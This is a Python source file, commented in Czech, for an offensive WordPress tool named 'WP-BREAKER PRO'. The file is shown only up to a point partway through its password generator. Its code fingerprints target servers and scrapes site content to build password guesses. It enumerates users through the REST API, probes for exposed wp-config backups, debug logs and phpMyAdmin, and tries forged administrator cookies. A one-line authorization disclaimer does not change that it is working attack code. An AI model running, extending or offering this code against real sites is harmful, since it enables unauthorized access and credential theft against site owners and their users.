#!/usr/bin/env python3
# =============================================================================
# WP-BREAKER PRO v5.0 - HACKER-AI-DRIVEN SUPER EDITION
# Multi-funkční WordPress penetration testing tool s AI inteligencí
# Autor: HackerAI Security Research
# Použití pouze na systémy, ke kterým máte explicitní oprávnění!
# =============================================================================

import os
import sys
import re
import json
import time
import random
import socket
import struct
import hashlib
import urllib.parse
import threading
from datetime import datetime
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed

# === KONTROLA A INSTALACE ZÁVISLOSTÍ ===
REQUIRED_PACKAGES = ['requests', 'bs4', 'colorama']

def check_and_install_deps():
    """Automaticky nainstaluje chybějící balíčky v Termuxu"""
    missing = []
    for pkg in REQUIRED_PACKAGES:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"\033[93m[!] Instaluji chybějící závislosti: {', '.join(missing)}...\033[0m")
        for pkg in missing:
            os.system(f"pip install {pkg} -q")
        print("\033[92m[✓] Hotovo! Restartuji...\033[0m")
        os.execv(sys.executable, ['python3'] + sys.argv)

check_and_install_deps()

# Nyní můžeme bezpečně importovat
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style

init(autoreset=True)

# =============================================================================
# GLOBÁLNÍ KONFIGURACE
# =============================================================================

VERSION = "5.0 SUPERIOR"
BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════╗
║   ██╗    ██╗██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ║
║   ██║    ██║██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║  ║
║   ██║ █╗ ██║██████╔╝█████╗██████╔╝██████╔╝█████╗  ███████║██║  ║
║   ██║███╗██║██╔═══╝ ╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║  ║
║   ╚███╔███╔╝██║           ██║  ██║██║  ██║███████╗██║  ██║██║  ║
║    ╚══╝╚══╝ ╚═╝           ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ║
║                                                                    ║
║  {Fore.CYAN}WORDPRESS BREAKER PRO v{VERSION}{Fore.RED}                                         ║
║  {Fore.YELLOW}HACKER-AI-DRIVEN • MULTI-FUNCTIONAL • SUPER-INTELLIGENT{Fore.RED}                  ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# =============================================================================
# TŘÍDY PRO JEDNOTLIVÉ MODULY
# =============================================================================

class Colors:
    """Barevné schéma pro konzistentní output"""
    HEADER = Fore.MAGENTA + Style.BRIGHT
    OKBLUE = Fore.BLUE + Style.BRIGHT
    OKGREEN = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    FAIL = Fore.RED + Style.BRIGHT
    INFO = Fore.CYAN + Style.BRIGHT
    RESULT = Fore.WHITE + Style.BRIGHT
    DIM = Fore.LIGHTBLACK_EX
    BOLD = Style.BRIGHT
    
    @staticmethod
    def status(success, text):
        """Vrátí formátovaný status řádek"""
        icon = f"{Fore.GREEN}[✓]{Style.RESET_ALL}" if success else f"{Fore.RED}[✗]{Style.RESET_ALL}"
        return f"{icon} {text}"

    @staticmethod
    def section(title):
        """Vrátí formátovaný nadpis sekce"""
        line = "─" * 60
        return f"\n{Fore.CYAN}{Style.BRIGHT}{' ' + title + ' ':=^60}{Style.RESET_ALL}\n"

    @staticmethod
    def finding(label, value, status="info"):
        """Formátované nalezení"""
        colors = {"info": Fore.CYAN, "success": Fore.GREEN, "danger": Fore.RED, "warning": Fore.YELLOW}
        c = colors.get(status, Fore.WHITE)
        return f"  {Fore.WHITE}▸ {label}: {c}{Style.BRIGHT}{value}{Style.RESET_ALL}"


class LiveOutput:
    """Live output handler - vše se zobrazuje v reálném čase"""
    
    def __init__(self):
        self.start_time = time.time()
        self.findings = []
        self.current_phase = ""
    
    def phase(self, name):
        """Zobrazí fázi skenování"""
        self.current_phase = name
        print(Colors.section(f" FÁZE: {name} "))
    
    def info(self, message):
        """Informační zpráva"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"  {Fore.DIM}[{timestamp}]{Style.RESET_ALL} {Fore.WHITE}{message}{Style.RESET_ALL}")
    
    def success(self, message):
        """Úspěch"""
        print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}")
    
    def warning(self, message):
        """Varování"""
        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} {Fore.YELLOW}{message}{Style.RESET_ALL}")
    
    def error(self, message):
        """Chyba"""
        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}")
    
    def add_finding(self, category, value, severity="info"):
        """Přidá nález do seznamu pro finální report"""
        self.findings.append({
            "category": category,
            "value": value,
            "severity": severity,
            "time": datetime.now().strftime("%H:%M:%S")
        })
    
    def result_line(self, key, value, color=Fore.WHITE):
        """Zobrazí pár klíč-hodnota"""
        print(f"    {Fore.DIM}├─{Style.RESET_ALL} {Fore.WHITE}{key}: {color}{Style.BRIGHT}{value}{Style.RESET_ALL}")
    
    def separator(self):
        """Oddělovač"""
        print(f"  {Fore.DIM}{'─' * 55}{Style.RESET_ALL}")
    
    def brute_force_progress(self, current, total, username, password, status=""):
        """Live progress brute-force"""
        percent = (current / total * 100) if total > 0 else 0
        bar_len = 30
        filled = int(bar_len * current // total) if total > 0 else 0
        bar = f"{Fore.GREEN}{'█' * filled}{Fore.DIM}{'░' * (bar_len - filled)}{Style.RESET_ALL}"
        
        status_color = Fore.GREEN if "SUCCESS" in status else (Fore.RED if "FAIL" in status else Fore.YELLOW)
        
        sys.stdout.write(f"\r  [{bar}] {Fore.CYAN}{current}/{total}{Style.RESET_ALL} "
                        f"({percent:.1f}%) | "
                        f"{Fore.WHITE}{username}:{Fore.YELLOW}{password}{Style.RESET_ALL} "
                        f"{status_color}{status}{Style.RESET_ALL}  ")
        sys.stdout.flush()
    
    def get_elapsed(self):
        """Vrátí uplynulý čas"""
        elapsed = time.time() - self.start_time
        if elapsed < 60:
            return f"{elapsed:.1f}s"
        return f"{elapsed//60:.0f}m {elapsed%60:.0f}s"


# =============================================================================
# TCP/IP STACK FINGERPRINTING
# =============================================================================

class TcpIpFingerprinter:
    """TCP/IP stack fingerprinting - zjištění OS a WAF"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.results = {}
    
    def fingerprint(self):
        """Provede fingerprinting targetu"""
        self.output.phase("TCP/IP STACK FINGERPRINTING")
        self.output.info("Analyzuji TCP/IP stack serveru...")
        
        # Odstranění protokolu z URL
        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        results = {}
        
        # HTTP hlavičky pro fingerprinting
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close"
            }
            
            resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
            
            # Server hlavička
            server = resp.headers.get("Server", "Neznámý")
            self.output.result_line("Server", server, Fore.CYAN)
            results["server"] = server
            self.output.add_finding("Server", server, "info")
            
            # X-Powered-By
            powered = resp.headers.get("X-Powered-By", "Není uvedeno")
            self.output.result_line("X-Powered-By", powered)
            if "PHP" in powered:
                self.output.add_finding("Technologie", powered, "info")
            
            # WAF detekce
            waf_headers = ["X-Sucuri-ID", "X-Sucuri-Cache", "CF-Ray", "X-WAF-Status",
                          "X-CloudFlare", "X-Protected-By", "Server-Gateway"]
            waf_detected = False
            for wh in waf_headers:
                if wh in resp.headers:
                    self.output.success(f"WAF detekována: {wh} = {resp.headers[wh]}")
                    self.output.add_finding("WAF", f"{wh}: {resp.headers[wh]}", "warning")
                    waf_detected = True
            
            if not waf_detected:
                self.output.info("Žádná známá WAF detekována")
                self.output.add_finding("WAF", "Nenalezena", "success")
            
            # Security headers
            sec_headers = {
                "Strict-Transport-Security": "HSTS",
                "Content-Security-Policy": "CSP",
                "X-Frame-Options": "ClickJacking ochrana",
                "X-Content-Type-Options": "MIME sniffing ochrana",
                "Referrer-Policy": "Referrer politika"
            }
            
            for header, name in sec_headers.items():
                if header in resp.headers:
                    self.output.result_line(name, resp.headers[header], Fore.GREEN)
                    self.output.add_finding(f"Security: {name}", resp.headers[header], "success")
            
            # IP geolokace (simulovaná)
            try:
                ip = socket.gethostbyname(hostname)
                self.output.result_line("IP adresa", ip, Fore.CYAN)
                self.output.add_finding("IP", ip, "info")
                
                # TTL odhad (ICMP echo)
                try:
                    # Ping-like TTL zjištění přes timeout
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((ip, 443 if "https" in self.target else 80))
                    ttl_info = s.getsockopt(socket.IPPROTO_IP, socket.IP_TTL, 4) if hasattr(socket, 'IP_TTL') else "N/A"
                    s.close()
                    
                    if ttl_info and ttl_info != "N/A":
                        ttl_val = int.from_bytes(ttl_info, byteorder='little') if isinstance(ttl_info, bytes) else 64
                        os_guess = "Linux/Unix" if ttl_val <= 64 else ("Windows" if ttl_val <= 128 else "Solaris/Cisco")
                        self.output.result_line("TTL odhad", f"{ttl_val} → {os_guess}", Fore.YELLOW)
                        self.output.add_finding("OS odhad (TTL)", f"{ttl_val} → {os_guess}", "info")
                except:
                    pass
                    
            except:
                pass
            
            # Cookies
            cookies = dict(resp.cookies)
            if cookies:
                self.output.info(f"Cookies: {len(cookies)} nalezena")
                for name, val in cookies.items():
                    self.output.add_finding("Cookie", f"{name}={val[:30]}...", "info")
            
            results["status_code"] = resp.status_code
            results["headers"] = dict(resp.headers)
            
        except Exception as e:
            self.output.error(f"Fingerprinting selhal: {str(e)}")
        
        self.results = results
        self.output.separator()
        return results


# =============================================================================
# CONTEXT SCRAPER - AI Intelligence
# =============================================================================

class AIContextScraper:
    """AI kontextový scraper - analyzuje obsah stránky pro inteligentní generování hesel"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.context = {
            "title": "",
            "description": "",
            "emails": [],
            "phones": [],
            "names": [],
            "keywords": [],
            "company": "",
            "year": "",
            "addresses": [],
            "social_media": [],
            "technologies": [],
            "users": [],
            "plugins": [],
            "themes": []
        }
    
    def scrape(self):
        """Provede kompletní kontextovou analýzu"""
        self.output.phase("AI CONTEXT SCRAPER - Inteligentní analýza")
        self.output.info("Stahuji a analyzuji obsah stránky pro generování hesel...")
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            resp = requests.get(self.target, headers=headers, timeout=15, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Title
            title = soup.title.string if soup.title else ""
            self.context["title"] = title.strip() if title else ""
            if self.context["title"]:
                self.output.success(f"Název stránky: {self.context['title']}")
                self.output.add_finding("Název stránky", self.context["title"], "info")
            
            # Description
            meta_desc = soup.find("meta", attrs={"name": "description"})
            if meta_desc and meta_desc.get("content"):
                self.context["description"] = meta_desc["content"]
                self.output.result_line("Meta Description", self.context["description"][:80] + "...")
            
            # Emaily - regex
            emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text))
            self.context["emails"] = list(emails)
            if self.context["emails"]:
                for e in self.context["emails"][:5]:
                    self.output.result_line("Email", e, Fore.YELLOW)
                    self.output.add_finding("Email", e, "info")
            
            # Telefony
            phones = set(re.findall(r'\+?\d{1,4}?[\s.-]?\(?\d{1,4}?\)?[\s.-]?\d{1,4}[\s.-]?\d{1,4}[\s.-]?\d{1,4}', resp.text))
            phones = {p for p in phones if len(p) > 6 and len(p) < 20}
            self.context["phones"] = list(phones)[:5]
            
            # Generování jmen z emailů
            for email in self.context["emails"]:
                name_part = email.split("@")[0]
                parts = re.split(r'[._\-]', name_part)
                for p in parts:
                    if len(p) > 2 and p not in self.context["names"]:
                        self.context["names"].append(p)
            
            # Hledání lidí v DOM
            for tag in soup.find_all(['span', 'div', 'p', 'li', 'a']):
                text = tag.get_text(strip=True)
                if text and len(text) > 3:
                    # Hledání jmen (česká jména)
                    name_match = re.findall(r'\b([A-ZÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ][a-záčďéěíňóřšťúůýž]+ [A-ZÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ][a-záčďéěíňóřšťúůýž]+)\b', text)
                    for nm in name_match:
                        if len(nm.split()) == 2 and nm not in self.context["names"]:
                            self.context["names"].append(nm)
            
            # WordPress specific
            wp_generator = soup.find("meta", attrs={"name": "generator"})
            if wp_generator and "WordPress" in wp_generator.get("content", ""):
                wp_ver = wp_generator["content"].replace("WordPress ", "")
                self.output.success(f"WordPress verze: {wp_ver}")
                self.output.add_finding("WordPress verze", wp_ver, "info")
                self.context["technologies"].append(f"WordPress {wp_ver}")
            
            # Pluginy z HTML komentářů a CSS/JS cest
            plugin_patterns = re.findall(r'/wp-content/plugins/([^/]+)/', resp.text)
            self.context["plugins"] = list(set(plugin_patterns))
            if self.context["plugins"]:
                for p in self.context["plugins"][:10]:
                    self.output.result_line("Plugin", p, Fore.CYAN)
                    self.output.add_finding("Plugin", p, "info")
            
            # Témata
            theme_patterns = re.findall(r'/wp-content/themes/([^/]+)/', resp.text)
            self.context["themes"] = list(set(theme_patterns))
            if self.context["themes"]:
                for t in self.context["themes"][:5]:
                    self.output.result_line("Theme", t, Fore.CYAN)
                    self.output.add_finding("Theme", t, "info")
            
            # Klíčová slova z obsahu
            body_text = soup.get_text()
            words = re.findall(r'\b[A-Za-zÁČĎÉĚÍŇÓŘŠŤÚŮÝŽáčďéěíňóřšťúůýž]{4,}\b', body_text.lower())
            word_freq = {}
            for w in words:
                if w not in ['the', 'and', 'for', 'was', 'are', 'but', 'not', 'you', 'all', 'can',
                            'that', 'have', 'with', 'from', 'this', 'they', 'been', 'what', 'when',
                            'more', 'some', 'word', 'each', 'which', 'their', 'will', 'about',
                            'nebo', 'jsou', 'byla', 'bylo', 'jeho', 'její', 'když', 'tedy',
                            'neboť', 'nebo', 'proto', 'protože', 'jak', 'ale', 'aby', 'bude']:
                    word_freq[w] = word_freq.get(w, 0) + 1
            
            sorted_words = sorted(word_freq.items(), key=lambda x: x[1], reverse=True)
            self.context["keywords"] = [w for w, c in sorted_words[:30]]
            
            # Rok
            years = re.findall(r'\b(19[0-9]{2}|20[0-9]{2})\b', resp.text)
            if years:
                self.context["year"] = max(set(years), key=years.count)
            
            # Firmu zjistíme z copyrightu
            copyright_match = re.search(r'(?:©|Copyright|copyright)[^.]*\b([A-Z][A-Za-z0-9\s&.]+)', resp.text)
            if copyright_match:
                self.context["company"] = copyright_match.group(1).strip()
                self.output.success(f"Firma: {self.context['company']}")
                self.output.add_finding("Firma", self.context["company"], "info")
            
            # Social media
            social_patterns = {
                "Facebook": r'facebook\.com/([A-Za-z0-9.]+)',
                "Twitter/X": r'twitter\.com/([A-Za-z0-9_]+)',
                "Instagram": r'instagram\.com/([A-Za-z0-9_.]+)',
                "LinkedIn": r'linkedin\.com/(?:company|in)/([A-Za-z0-9-]+)',
                "YouTube": r'youtube\.com/(?:c|channel|user)/([A-Za-z0-9_-]+)'
            }
            for platform, pattern in social_patterns.items():
                matches = re.findall(pattern, resp.text)
                if matches:
                    self.context["social_media"].append(f"{platform}: {matches[0]}")
                    self.output.result_line(platform, matches[0], Fore.CYAN)
            
            # Uživatelé z REST API
            try:
                api_url = self.target.rstrip('/') + '/wp-json/wp/v2/users'
                api_resp = requests.get(api_url, headers=headers, timeout=5, verify=False)
                if api_resp.status_code == 200:
                    users = api_resp.json()
                    for user in users:
                        username = user.get('slug') or user.get('name', '')
                        if username:
                            self.context["users"].append(username)
                            self.output.success(f"Uživatel (REST API): {username}")
                            self.output.add_finding("Uživatel (REST API)", username, "danger")
            except:
                pass
            
            self.output.separator()
            self.output.info(f"AI kontext připraven: {len(self.context['emails'])} emailů, "
                           f"{len(self.context['names'])} jmen, {len(self.context['keywords'])} klíčových slov")
            
        except Exception as e:
            self.output.error(f"AI scraping selhal: {str(e)}")
        
        return self.context


# =============================================================================
# DOM SHADOW ANALYZER
# =============================================================================

class DOMShadowAnalyzer:
    """DOM Shadow Analyzer - hledá skryté formuláře, komentáře, JS proměnné"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.findings = {}
    
    def analyze(self):
        """Analýza DOM stínových prvků"""
        self.output.phase("DOM SHADOW ANALYZER - Skryté prvky")
        shadow_data = {
            "hidden_forms": [],
            "hidden_inputs": [],
            "commented_forms": [],
            "js_variables": [],
            "base64_strings": [],
            "api_endpoints": []
        }
        
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
            html = resp.text
            soup = BeautifulSoup(html, 'html.parser')
            
            # Skryté inputy
            hidden_inputs = soup.find_all("input", type="hidden")
            if hidden_inputs:
                self.output.info(f"Skrytých inputů: {len(hidden_inputs)}")
                for inp in hidden_inputs[:10]:
                    name = inp.get("name", "?" )
                    value = inp.get("value", "")[:40]
                    self.output.result_line(f"Hidden input", f"{name} = {value}", Fore.YELLOW)
                    shadow_data["hidden_inputs"].append({"name": name, "value": value})
                    if "wpnonce" in name.lower() or "nonce" in name.lower() or "_wpnonce" in name.lower():
                        self.output.success(f"NONCE token nalezen: {name} = {value}")
                        self.output.add_finding("NONCE token", f"{name}={value}", "danger")
            
            # Skryté formuláře (display:none, visibility:hidden)
            all_forms = soup.find_all("form")
            for form in all_forms:
                style = form.get("style", "")
                if "display" in style.lower() or "visibility" in style.lower() or "hidden" in style.lower():
                    shadow_data["hidden_forms"].append(str(form)[:100])
                    self.output.warning(f"Skrytý formulář nalezen!")
                    self.output.add_finding("Skrytý formulář", str(form.get("action", "?"))[:80], "warning")
            
            # Zakomentované formuláře
            comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
            for comment in comments:
                if 'form' in comment.lower() and ('action' in comment.lower() or 'method' in comment.lower()):
                    shadow_data["commented_forms"].append(comment[:150])
                    self.output.warning(f"Zakomentovaný formulář v HTML!")
                    self.output.add_finding("Zakomentovaný formulář", comment[:80], "warning")
                # Hledáme credentials v komentářích
                if any(kw in comment.lower() for kw in ['password', 'username', 'login', 'admin', 'pass', 'heslo']):
                    self.output.warning(f"Potenciální credentials v komentáři!")
                    self.output.add_finding("Credentials v komentáři", comment[:100], "danger")
            
            # JavaScript proměnné
            js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
            js_vars2 = re.findall(r'let\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
            js_vars3 = re.findall(r'const\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
            all_js = js_vars + js_vars2 + js_vars3
            
            for name, value in all_js:
                if any(kw in name.lower() for kw in ['key', 'token', 'secret', 'pass', 'auth', 'api', 'nonce']):
                    shadow_data["js_variables"].append({"name": name, "value": value})
                    self.output.warning(f"JS proměnná: {name} = {value}")
                    self.output.add_finding(f"JS proměnná: {name}", value[:60], "danger")
            
            # Base64 stringy
            b64_strings = re.findall(r'([A-Za-z0-9+/]{20,}={0,2})', html)
            for b64 in b64_strings[:5]:
                try:
                    decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                    if any(kw in decoded.lower() for kw in ['password', 'user', 'login', 'admin']):
                        shadow_data["base64_strings"].append({"encoded": b64[:30], "decoded": decoded[:60]})
                        self.output.warning(f"Base64 obsahuje credentials! {decoded[:60]}")
                        self.output.add_finding("Base64 credentials", decoded[:60], "danger")
                except:
                    pass
            
            # API endpointy z JS
            api_patterns = re.findall(r'["\'](/wp-json/[^"\']+|/api/[^"\']+|/v[0-9]/[^"\']+)["\']', html)
            shadow_data["api_endpoints"] = list(set(api_patterns))
            if shadow_data["api_endpoints"]:
                self.output.info(f"API endpointy: {len(shadow_data['api_endpoints'])}")
                for ep in shadow_data["api_endpoints"][:5]:
                    self.output.result_line("API", ep, Fore.CYAN)
                    self.output.add_finding("API endpoint", ep, "info")
            
            self.output.separator()
            
        except Exception as e:
            self.output.error(f"DOM analýza selhala: {str(e)}")
        
        self.findings = shadow_data
        return shadow_data


# =============================================================================
# COOKIE ENGINE
# =============================================================================

class CookieEngine:
    """Cookie manipulace, injekce a validace"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.cookies_found = {}
        self.session = requests.Session()
    
    def analyze_cookies(self):
        """Analyzuje cookies z targetu"""
        self.output.phase("COOKIE ENGINE - Manipulace a injekce")
        results = {"cookies": {}, "vulnerabilities": [], "valid_session": False}
        
        try:
            resp = self.session.get(self.target, timeout=10, verify=False)
            cookies = dict(resp.cookies)
            self.cookies_found = cookies
            
            if cookies:
                self.output.info(f"Cookies nalezeny: {len(cookies)}")
                for name, value in cookies.items():
                    self.output.result_line(name, value[:40], Fore.YELLOW)
                    self.output.add_finding("Cookie", f"{name}={value[:40]}", "info")
                    
                    # Bezpečnostní analýza cookie
                    for cookie in resp.cookies:
                        if not cookie.secure:
                            self.output.warning(f"Cookie '{name}' není Secure!")
                            results["vulnerabilities"].append(f"{name} není Secure")
                        if not cookie.has_nonstandard_attr('HttpOnly') and not cookie.get('httponly'):
                            self.output.warning(f"Cookie '{name}' není HttpOnly!")
                            results["vulnerabilities"].append(f"{name} není HttpOnly")
            else:
                self.output.info("Žádné cookies nenalezeny")
            
            # Session ID predikce
            for name, value in cookies.items():
                if any(kw in name.lower() for kw in ['session', 'token', 'auth', 'sess']):
                    self.output.warning(f"Session cookie: {name}, délka: {len(value)}")
                    self.output.add_finding("Session cookie", f"{name} (délka: {len(value)})", "warning")
                    
                    # Test na predikovatelnost
                    if len(value) < 20:
                        self.output.warning(f"Krátká session ID - možná predikovatelná!")
                        results["vulnerabilities"].append(f"Predikovatelná session: {name}")
            
            # Test cookie injection (admin session)
            self.output.info("Testuji cookie injection na wp-admin...")
            admin_url = self.target.rstrip('/') + '/wp-admin/admin-ajax.php'
            
            test_cookies = [
                {"wordpress_logged_in_" + hashlib.md5(b"admin").hexdigest()[:32]: "admin|" + str(int(time.time()) + 86400) + "|administrator"},
                {"wordpress_" + hashlib.md5(b"admin").hexdigest()[:32]: "admin%7C" + str(int(time.time()) + 86400) + "%7Cadministrator"},
            ]
            
            for i, test_c in enumerate(test_cookies):
                try:
                    test_resp = requests.get(admin_url, cookies=test_c, timeout=5, verify=False)
                    if test_resp.status_code != 403 and test_resp.status_code != 401:
                        self.output.success(f"Cookie injekce možná! ({test_resp.status_code})")
                        results["vulnerabilities"].append("Cookie injection možná")
                        self.output.add_finding("Cookie injekce", f"Možná! Status: {test_resp.status_code}", "danger")
                except:
                    pass
            
            self.output.separator()
            
        except Exception as e:
            self.output.error(f"Cookie analýza selhala: {str(e)}")
        
        return results


# =============================================================================
# BYPASS RESEARCHER
# =============================================================================

class BypassResearcher:
    """Hledá alternativní cesty k admin přístupu"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.findings = {}
    
    def research(self):
        """Prozkoumá alternativní metody přístupu"""
        self.output.phase("BYPASS RESEARCHER - Alternativní cesty")
        results = {
            "xmlrpc": False,
            "json_api": False,
            "rest_api": False,
            "alt_login_pages": [],
            "debug_log": False,
            "wp_config_backup": False,
            "phpmyadmin": False,
            "vulnerable_endpoints": []
        }
        
        base = self.target.rstrip('/')
        headers = {"User-Agent": "Mozilla/5.0"}
        
        # 1. XML-RPC
        self.output.info("Testuji XML-RPC...")
        try:
            xmlrpc_url = base + "/xmlrpc.php"
            xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            xml_resp = requests.post(xmlrpc_url, data=xml_data, headers={"Content-Type": "text/xml"}, timeout=5, verify=False)
            if xml_resp.status_code == 200 and "methodName" in xml_resp.text:
                self.output.success("XML-RPC je aktivní!")
                results["xmlrpc"] = True
                self.output.add_finding("XML-RPC", "Aktivní - možný brute-force!", "danger")
        except:
            pass
        
        # 2. JSON API
        json_url = base + "/wp-json/wp/v2/"
        try:
            jr = requests.get(json_url, headers=headers, timeout=5, verify=False)
            if jr.status_code == 200:
                self.output.success("REST API je přístupné!")
                results["rest_api"] = True
                self.output.add_finding("REST API", f"Přístupné - {json_url}", "warning")
        except:
            pass
        
        # 3. Alternativní login stránky
        alt_pages = [
            "/wp-login.php", "/wp-admin/", "/login", "/admin",
            "/user/login", "/administrator", "/site-admin",
            "/wp-signup.php", "/backend", "/portal",
            "/cms/wp-login.php", "/admin/login.php"
        ]
        
        self.output.info("Hledám alternativní login stránky...")
        for page in alt_pages:
            try:
                url = base + page
                pr = requests.get(url, headers=headers, timeout=3, verify=False, allow_redirects=False)
                if pr.status_code in [200, 301, 302, 303]:
                    self.output.result_line(page, str(pr.status_code), Fore.GREEN if pr.status_code == 200 else Fore.YELLOW)
                    if pr.status_code == 200:
                        results["alt_login_pages"].append(page)
                        self.output.add_finding("Login stránka", f"{page} (HTTP {pr.status_code})", "info")
            except:
                pass
        
        # 4. Debug log
        debug_paths = [
            "/wp-content/debug.log",
            "/wp-content/debug.log.1",
            "/wp-content/uploads/debug.log"
        ]
        for dp in debug_paths:
            try:
                dr = requests.get(base + dp, headers=headers, timeout=3, verify=False)
                if dr.status_code == 200 and len(dr.text) > 50:
                    self.output.warning(f"DEBUG LOG nalezen: {dp}")
                    results["debug_log"] = True
                    self.output.add_finding("Debug log", dp, "danger")
                    # Hledání credentials v debug logu
                    if "password" in dr.text.lower() or "DB_PASSWORD" in dr.text:
                        self.output.error(f"Credentials v debug logu!")
                        self.output.add_finding("Credentials v debug logu", "OKAMŽITÉ OHROŽENÍ!", "danger")
            except:
                pass
        
        # 5. wp-config.php backup
        config_paths = [
            "/wp-config.php.bak",
            "/wp-config.php.old",
            "/wp-config.txt",
            "/wp-config.save",
            "/wp-config.php~",
            "/wp-config.php.swp"
        ]
        for cp in config_paths:
            try:
                cr = requests.get(base + cp, headers=headers, timeout=3, verify=False)
                if cr.status_code == 200 and "DB_NAME" in cr.text:
                    self.output.error(f"Záloha wp-config nalezena: {cp}")
                    results["wp_config_backup"] = True
                    self.output.add_finding("wp-config záloha", cp, "danger")
            except:
                pass
        
        # 6. phpMyAdmin
        phpmyadmin_paths = ["/phpmyadmin", "/pma", "/phpMyAdmin", "/admin/phpmyadmin"]
        for pp in phpmyadmin_paths:
            try:
                pr = requests.get(base + pp, headers=headers, timeout=3, verify=False)
                if pr.status_code == 200 and ("phpMyAdmin" in pr.text or "pma" in pr.text[:500]):
                    self.output.warning(f"phpMyAdmin nalezen: {pp}")
                    results["phpmyadmin"] = True
                    self.output.add_finding("phpMyAdmin", pp, "danger")
            except:
                pass
        
        # 7. User enumeration přes REST API
        try:
            users_url = base + "/wp-json/wp/v2/users?per_page=100"
            ur = requests.get(users_url, headers=headers, timeout=5, verify=False)
            if ur.status_code == 200:
                users = ur.json()
                self.output.success(f"User enumeration: {len(users)} uživatelů!")
                for u in users:
                    name = u.get('name', u.get('slug', '?'))
                    self.output.result_line("Uživatel", f"{name} (ID: {u.get('id', '?')})", Fore.YELLOW)
                    self.output.add_finding("Uživatel (enum)", name, "danger")
        except:
            pass
        
        self.output.separator()
        self.findings = results
        return results


# =============================================================================
# AI PASSWORD GENERATOR
# =============================================================================

class AIPasswordGenerator:
    """AI generátor hesel z kontextu stránky"""
    
    TOP_PASSWORDS = [
        "admin", "password", "123456", "12345678", "qwerty",
        "admin123", "letmein", "welcome", "monkey", "dragon",
        "master", "sunshine", "princess", "football", "iloveyou",
        "trustno1", "abc123", "passw0rd", "p@ssword", "Pa$$word",
        "admin1", "administrator", "root", "toor", "changeme",
        "secret", "P@ssw0rd", "Passw0rd", "p@ssw0rd", "password123",
        "admin123456", "qwerty123", "letmein123", "welcome123",
        "test", "test123", "demo", "demo123", "user",
        "password1", "Password1", "Password123", "P@ssword123",
        "admin2024", "admin2025", "admin2026", "password2024",
        "password2025", "password2026", "changeme123", "default",
        "wp", "wordpress", "wpadmin", "wpadm", "wp_admin"
    ]
    
    KEYBOARD_PATTERNS = [
        "qwerty", "qwertz", "asdfgh", "zxcvbn", "qwerty123",
        "1q2w3e", "1q2w3e4r", "qwertyuiop", "123qwe", "qwe123",
        "asdf", "asdf1234", "zxcvbnm", "1qaz2wsx", "qwaszx"
    ]
    
    def __init__(self, context, output):
        self.context = context
        self.output = output
    
    def generate(self):
        """Vygeneruje AI wordlist z kontextu stránky"""
        self.output.phase("AI PASSWORD GENERATOR - Inteligentní generování")
        self.output.info("Generuji hesla z kontextu stránky...")
        
        passwords = OrderedDict()
        
        # 1. Základní top passwords
        for p in self.TOP_PASSWORDS:
            passwords[p.lower()] = 90
        
        # 2. Keyboard patterns
        for p in self.KEYBOARD_PATTERNS:
            passwords[p.lower()] = 80
        
        # 3. Z emailů (jména)
        for email in self.context.get("emails", []):
            name_part = email.split("@")[0]
            parts = re.split(r'[._\-]', name_part)
            for part in parts:
                if len(part) > 2:
                    passwords[part.lower()] = 75
                    passwords[part.lower() + "123"] = 70
                    passwords[part.lower() + "!"] = 68
                    passwords[part.capitalize()] = 65
                    passwords[part.capitalize() + "123"] = 62
                    passwords[part.lower() + "2024"] = 60
                    passwords[part.lower() + "2025"] = 60
                    passwords[part.lower() + "2026"] = 60
        
        # 4. Z názvu stránky
        title = self.context.get("title", "")
        if title:
            title_words = re.findall(r'\w+', title.lower())
            for w in title_words[:5]:
                if len(w) > 2:
                    passwords[w] = 85
                    passwords[w + "123"] = 80
                    passwords[w + "!"] = 78
                    passwords[w.capitalize()] = 75
                    passwords[w.capitalize() + "123"] = 72
        
